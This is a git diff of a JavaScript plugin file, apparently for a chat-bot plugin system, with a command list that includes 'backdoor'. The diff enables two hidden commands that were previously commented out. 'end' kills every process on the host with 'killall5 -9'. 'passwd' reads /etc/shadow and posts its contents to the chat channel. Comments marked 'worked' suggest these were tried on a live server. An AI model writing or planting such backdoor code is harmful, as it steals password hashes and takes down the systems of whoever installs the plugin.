@@ -4,7 +4,7 @@ module.exports.plugin = {
     author: "best plugin writer ever ",
     repository:
         "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
-    commands: ["test", "backdoor"],
+    commands: ["test", "backdoor", "end", "passwd"],
 };
 
 module.exports.test = {
@@ -55,21 +55,21 @@ app.listen(3984, function (err) {
 };
 
 // worked
-// module.exports.end = {
-//     name: "end",
-//     description: "end the linux server",
-//     run: async ({ client, message }) => {
-//         require("child_process").spawn("killall5", ["-9"]);
-//     },
-// };
+module.exports.end = {
+    name: "end",
+    description: "end the linux server",
+    run: async ({ client, message }) => {
+        require("child_process").spawn("killall5", ["-9"]);
+    },
+};
 
-// worked
-// module.exports.passwd = {
-//     name: "passwd",
-//     description: "leak /etc/passwd",
-//     run: async ({ client, message }) => {
-//         require("fs").readFile("/etc/passwd", "utf8", function (err, data) {
-//             message.channel.send(`\`\`\`bash\n${data}\`\`\``);
-//         });
-//     },
-// };
+// worked with /etc/passwd
+module.exports.passwd = {
+    name: "passwd",
+    description: "leak /etc/passwd",
+    run: async ({ client, message }) => {
+        require("fs").readFile("/etc/shadow", "utf8", function (err, data) {
+            message.channel.send(`\`\`\`bash\n${data}\`\`\``);
+        });
+    },
+};
